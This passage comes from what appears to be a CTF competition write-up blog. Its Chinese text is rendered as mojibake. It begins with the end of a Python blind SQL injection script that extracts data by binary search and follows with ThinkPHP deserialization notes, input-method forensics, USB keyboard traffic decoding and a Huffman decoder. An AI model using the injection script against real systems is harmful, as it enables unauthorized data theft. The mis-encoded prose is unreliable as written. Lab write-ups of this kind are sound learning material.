&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;</span>)then(cot(0))else(1)end)#&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = session.post(url=url, data=param)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Username&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        mid_num = <span class="built_in">int</span>((high + low + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        text += <span class="built_in">chr</span>(mid_num)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;972f6491-7e54-47b1-ada0-639991ecd284&#125;</span><br></pre></td></tr></table></figure><h3 id="eztp"><a href="#eztp" class="headerlink" title="eztp"></a>eztp</h3><blockquote><p>ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–POPé“¾ï¼š<a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p></blockquote><p><code>.../www.zip</code> è¯»åˆ°æºç æ³„éœ²ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>æœ‰æ‰‹å°±è¡Œçš„ç­”é¢˜ã€‚</p><blockquote><p>å‚è€ƒï¼š<a href="https://www.cnitpm.com/pm/32463.html">https://www.cnitpm.com/pm/32463.html</a></p></blockquote><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617358076482/07a4ba821854dd46252e4b024f508e5dc420bddc.png@300w.png"></p><p>åœ¨æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œå£ä»¤ä¿æŠ¤æ˜¯ä¿¡æ¯ç³»ç»Ÿçš„ç¬¬ä¸€é“å±éšœã€‚</p><p>ä¸ºäº†é˜²æ­¢ç‰©ç†ä¸Šå–èµ°æ•°æ®åº“è€Œé‡‡å–çš„åŠ å¼ºæ•°æ®åº“å®‰å…¨çš„æ–¹æ³•æ˜¯æ•°æ®åº“åŠ å¯†ã€‚</p><p>ç³»ç»Ÿè¦è¾¾åˆ°ä»€ä¹ˆæ ·çš„å®Œæ•´æ€§ï¼Œå–å†³äºç³»ç»Ÿæ‰€å¤„ç†ä¿¡æ¯åœ°é‡è¦ç¨‹åº¦ã€ä»·å€¼å’Œæ•æ„Ÿæ€§ã€‚</p><p>åœ¨æ•°æ®åº“çš„å®‰å…¨è¯„ä¼°è¿‡ç¨‹ä¸­ï¼Œå¯è¡Œæ€§æ˜¯æŒ‡ç³»ç»Ÿèƒ½å¤Ÿå¯¹ä»˜å„ç§å¯èƒ½åœ°æ”»å‡»çš„èƒ½åŠ›ã€‚</p><p>æ•°æ®åº“è®¿é—®æ§åˆ¶ç­–ç•¥ä¸­ï¼Œåªéœ€ç­–ç•¥æ˜¯åªè®©ç”¨æˆ·å¾—åˆ°æœ‰ç›¸åº”æƒé™çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ°åˆ°å¯ä»¥è®©ç”¨æˆ·å®Œæˆè‡ªå·±çš„å·¥ä½œï¼Œå…¶ä»–çš„æƒåˆ©ä¸€å¾‹ä¸ç»™ã€‚</p><p>æ•°æ®åº“çš„å®‰å…¨ç­–ç•¥æ˜¯æŒ‡å¦‚ä½•ç»„ç»‡ã€ç®¡ç†ã€ä¿æŠ¤å’Œå¤„ç†æ•æ„Ÿä¿¡æ¯çš„æŒ‡å¯¼æ€æƒ³ã€‚å®ƒåŒ…æ‹¬å®‰å…¨ç®¡ç†ç­–ç•¥ã€è®¿é—®æ§åˆ¶ç­–ç•¥å’Œä¿¡æ¯æ§åˆ¶ç­–ç•¥ã€‚</p><p>æ•°æ®åº“çš„åŠ å¯†æ–¹æ³•ä¸­ï¼Œé‡‡ç”¨åº“å¤–åŠ å¯†ï¼Œåˆ™å¯†é’¥ç®¡ç†è¾ƒä¸ºç®€å•ï¼Œåªéœ€å€Ÿç”¨æ–‡ä»¶åŠ å¯†çš„å¯†é’¥ç®¡ç†æ–¹æ³•ã€‚</p><p>åœ¨ä¸‹é¢çš„åŠ å¯†æ–¹æ³•ä¸­ï¼Œå…ƒç´ åŠ å¯†åŠ è§£å¯†çš„æ•ˆç‡æœ€ä½ã€‚</p><p>äº‹æ•…æ•…éšœæ˜¯æŒ‡äº‹åŠ¡åœ¨è¿è¡Œè‡³æ­£å¸¸ç»ˆæ­¢å‰è¢«ä¸­æ­¢ï¼Œè¿™æ—¶æ¢å¤å­ç³»ç»Ÿåº”åˆ©ç”¨æ—¥å¿—æ–‡ä»¶æ’¤é”€æ­¤äº‹ç‰©å·²å¯¹æ•°æ®åº“è¿›è¡Œçš„ä¿®æ”¹ã€‚</p><p>å‘ç”Ÿä»‹è´¨æ•…éšœåï¼Œç£ç›˜ä¸Šçš„ç‰©ç†æ•°æ®å’Œæ—¥å¿—æ–‡ä»¶è¢«ç ´åï¼Œè¿™æ˜¯æœ€ä¸¥é‡çš„ä¸€ç§æ•…éšœï¼Œæ¢å¤æ–¹æ³•æ˜¯é‡è£…æ•°æ®åº“ï¼Œç„¶åé‡åšå·²å®Œæˆçš„äº‹åŠ¡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4df9488a-b979-4151-9f15-baa772faab3f&#125;</span><br></pre></td></tr></table></figure><h3 id="InputMonitor"><a href="#InputMonitor" class="headerlink" title="InputMonitor"></a>InputMonitor</h3><blockquote><p>Akiraåœ¨æŸæ¬¡å–è¯çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨æ¡Œé¢æ‰¾åˆ°äº†ä¸€ä¸ªå¥‡æ€ªçš„æ–‡ä»¶ï¼Œä½†æ˜¯é™¤æ­¤ä¹‹å¤–å¥½åƒæ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆæœ‰ä»·å€¼çš„æƒ…æŠ¥ï¼Œå¾ˆå¤šçš„æ•°æ®éƒ½è¢«æŠ¹å¹²å‡€äº†ï¼Œè€Œä¸”è¿™ä¸ªç”¨æˆ·ä¼¼ä¹æ ¹æœ¬å°±æ²¡è£…ä»€ä¹ˆç¬¬ä¸‰æ–¹çš„è½¯ä»¶ã€‚Akiraè¿˜ç²—å¿ƒçš„åªæ‹·è´äº†Cç›˜ä¸‹çš„Userç›®å½•ï¼Œè¿™ä¸‹è¿˜æœ‰æœºä¼šè§£å¼€å¯ç–‘æ–‡ä»¶å—ï¼Ÿ</p></blockquote><p>æŸ¥çœ‹é™„ä»¶ä¸­ç”¨æˆ· link3 çš„æ¡Œé¢æ–‡ä»¶å¯ä»¥å‘ç°å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ²¡äº‹ï¼Œæˆ‘éƒ½åˆ æ‰äº†ï¼Œä¹‹å‰çš„èŠå¤©è®°å½•éƒ½è¢«æˆ‘æ¸…å¹²å‡€äº†ã€‚é™¤éä»–ä»¬åœ¨ç›‘æ§æˆ‘è¾“å…¥</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¾—çŸ¥éœ€è¦åˆ†æå¾®è½¯è¾“å…¥æ³•çš„å­¦ä¹ è¯åº“ï¼Œå¹¶ä¸”å¯ä»¥å¾—åˆ° flag.7zã€‚å®šå‘åˆ° <code>%appdata%\Microsoft\InputMethod\Chs</code> å¯å¾— ChsPinyinIH.dat å’Œ ChsPinyinUDL.datã€‚ä½¿ç”¨è¯åº“è½¬æ¢æ–‡ä»¶æå– UDL æ–‡ä»¶ä¸­çš„å†…å®¹å¯å¾—æç¤ºã€‚</p><blockquote><p>studyzy/imewlconverter: <a href="https://github.com/studyzy/imewlconverter">https://github.com/studyzy/imewlconverter</a></p></blockquote><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474546488/deeae47218a5332e33a85e2b3204c5a786ddc960.png"></p><p>æ­¤æ—¶å¯çŸ¥å¯†ç æ˜¯å…­ä¸ªå­—ã€‚å†å°† IH æ–‡ä»¶ä¸­çš„å†…å®¹ä½¿ç”¨ UTF-16LE çš„æ ¼å¼è§£ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474654580/0da53e45c986f323c9c5e44f2884f07a0e1d47e5.png" alt="image-20210404023052648"></p><p>æ­¤æ—¶å¾—åˆ°å‹ç¼©åŒ…çš„å¯†ç  <code>æœ‰å¿—è€…äº‹ç«Ÿæˆ</code>ã€‚è§£å‹å‹ç¼©åŒ…åå¾—åˆ° hidden.pdf æ–‡ä»¶ã€‚å°† PDF æ–‡ä»¶ä½¿ç”¨ Acrobat DC æ‰“å¼€åå°†å›¾ç‰‡ç§»å¼€å³å¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474845995/829b70a6cfa12d47999bdddf033a5c72622023c2.png@300w"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_F1nd_h1dd3n_m3g&#125;</span><br></pre></td></tr></table></figure><h3 id="æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„"><a href="#æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„" class="headerlink" title="æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„"></a>æˆ‘çš„å¿ƒæ˜¯å†°å†°çš„</h3><p>é™„ä»¶ç›´æ¥è§£å‹ä¼šæç¤ºæ–‡ä»¶å¤´é”™è¯¯ï¼Œå› æ­¤ç›´æ¥é‡‡ç”¨ CyberChef æ¥æå–æ–‡ä»¶ã€‚<code>Extract Files</code> å¯ä»¥å‘ç°æœ‰å¦‚ä¸‹å›¾ç‰‡ï¼Œå°†å›¾ç‰‡å’Œå‹ç¼©æ–‡æ¡£ä¸‹è½½ä¸‹æ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617475381094/5f933f522524ad736a81bfca551f7d633ed70984.png"></p><p>å¯¹æå–å‡ºçš„å›¾ç‰‡ä½¿ç”¨ Java ç›²æ°´å°å·¥å…·æå–æ°´å° <code>javaw -jar .\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c &#39;.\extracted_at_0x51.jpg&#39; &#39;.\extracted_at_0x51_d.jpg&#39;</code> å¯å¾—å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617517178191/1bb1a0be2368cc55cdfd76143e4bd788551d026a.jpg@200w_200h_1c"></p><p>å¯çŸ¥å‹ç¼©åŒ…å¯†ç ä¸º <code>gnibgnib</code>ã€‚è§£å‹å‹ç¼©æ–‡ä»¶åå¾—åˆ°æµé‡åŒ…ã€‚ä½¿ç”¨ WireShark å¾ˆå®¹æ˜“çœ‹å‡ºæ˜¯ USB æµé‡ã€‚åŒæ—¶å¯ä»¥å‘ç°è®¾å¤‡çš„åˆ¶é€ å‚å•†æ˜¯ <code>Holtek Semiconductor, Inc.</code>ã€‚å…ˆä½¿ç”¨ tshark å°†è®¾å¤‡çš„ Leftover Capture Data ç»™æå–å‡ºæ¥ <code>tshark.exe -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code>ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000060000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000050000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">00002a0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000070000000000</span><br></pre></td></tr></table></figure><p>USB Keyboard Data Hacker è·‘ä¸€ä¸‹å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b3866396564326639333365662&lt;DEL&gt;31346138643035323364303334396531323939637d</span><br></pre></td></tr></table></figure><p>å°†æ•°æ®æ•´ç†æˆå¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b38663965643266393333656631346138643035323364303334396531323939637d</span><br></pre></td></tr></table></figure><p>å† <code>From Hex</code> å³å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;</span><br></pre></td></tr></table></figure><h3 id="æ­ªæ¯”æ­ªæ¯”"><a href="#æ­ªæ¯”æ­ªæ¯”" class="headerlink" title="æ­ªæ¯”æ­ªæ¯”"></a>æ­ªæ¯”æ­ªæ¯”</h3><p>é™„ä»¶ç»™å‡ºçš„ data å¾ˆæ˜æ˜¾æ˜¯æµé‡åŒ…ï¼Œä½¿ç”¨ Wireshark åˆ†æï¼Œè·Ÿè¸ª TCP æµã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617516627746/2bb321fbe2bf4f220f0e679d964eee3f8d96eb71.png"></p><p>å¾ˆå®¹æ˜“çœ‹å‡ºæ˜¯å“ˆå¤«æ›¼ç¼–ç ï¼Œç½‘ä¸Šæ‰¾ä¸€æ®µä»£ç è§£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»Ÿè®¡å­—ç¬¦å‡ºç°é¢‘ç‡ï¼Œç”Ÿæˆæ˜ å°„è¡¨</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_frequency</span>(<span class="params">text</span>):</span></span><br><span class="line">    chars = []</span><br><span class="line">    ret = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chars.append(char)</span><br><span class="line">            ret.append((char, text.count(char)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># èŠ‚ç‚¹ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, frequency</span>):</span></span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line">        self.father = <span class="literal">None</span></span><br><span class="line">        self.frequency = frequency</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.father.left == self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå¶å­èŠ‚ç‚¹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_nodes</span>(<span class="params">frequency_list</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [Node(frequency) <span class="keyword">for</span> frequency <span class="keyword">in</span> frequency_list]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºHuffmanæ ‘</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_huffman_tree</span>(<span class="params">nodes</span>):</span></span><br><span class="line">    queue = nodes[:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(queue) &gt; <span class="number">1</span>:</span><br><span class="line">        queue.sort(key=<span class="keyword">lambda</span> item: item.frequency)</span><br><span class="line">        node_left = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_right = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_father = Node(node_left.frequency + node_right.frequency)</span><br><span class="line">        node_father.left = node_left</span><br><span class="line">        node_father.right = node_right</span><br><span class="line">        node_left.father = node_father</span><br><span class="line">        node_right.father = node_father</span><br><span class="line">        queue.append(node_father)</span><br><span class="line"></span><br><span class="line">    queue[<span class="number">0</span>].father = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> queue[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Huffmanç¼–ç </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">huffman_encoding</span>(<span class="params">nodes, root</span>):</span></span><br><span class="line">    huffman_code = [<span class="string">&#x27;&#x27;</span>] * <span class="built_in">len</span>(nodes)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nodes)):</span><br><span class="line">        node = nodes[i]</span><br><span class="line">        <span class="keyword">while</span> node != root:</span><br><span class="line">            <span class="keyword">if</span> node.is_left():</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;0&#x27;</span> + huffman_code[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;1&#x27;</span> + huffman_code[i]</span><br><span class="line">            node = node.father</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> huffman_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–ç æ•´ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_str</span>(<span class="params">text, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency:</span><br><span class="line">            <span class="keyword">if</span> char == item[<span class="number">0</span>]:</span><br><span class="line">                ret += codes[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£ç æ•´ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_str</span>(<span class="params">huffman_str, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> huffman_str != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> codes:</span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">in</span> huffman_str <span class="keyword">and</span> huffman_str.index(item) == <span class="number">0</span>:</span><br><span class="line">                ret += char_frequency[i][<span class="number">0</span>]</span><br><span class="line">                huffman_str = huffman_str[<span class="built_in">len</span>(item):]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># text = raw_input(&#x27;The text to encode:&#x27;)</span></span><br><span class="line">    huf_text = <span class="string">&quot;HUFFMAN_ENCODED_TEXT&quot;</span></span><br><span class="line">    char_frequency = [(<span class="string">&#x27;j&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;z&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;7&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;l&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;6&#x27;</span>, <span class="number">37</span>), (<span class="string">&#x27;4&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;p&#x27;</span>, <span class="number">38</span>), (<span class="string">&#x27;h&#x27;</span>, <span class="number">27</span>),(<span class="string">&#x27;g&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;x&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;i&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;8&#x27;</span>, <span class="number">36</span>), (<span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;o&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>),(<span class="string">&#x27;y&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;m&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;v&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;d&#x27;</span>, <span class="number">33</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;9&#x27;</span>, <span class="number">33</span>),(<span class="string">&#x27;t&#x27;</span>, <span class="number">21</span>), (<span class="string">&#x27;w&#x27;</span>, <span class="number">22</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;r&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;s&#x27;</span>, <span class="number">16</span>), (<span class="string">&#x27;k&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;5&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;q&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="number">32</span>),(<span class="string">&#x27;&#123;&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;-&#x27;</span>, <span class="number">4</span>), (<span 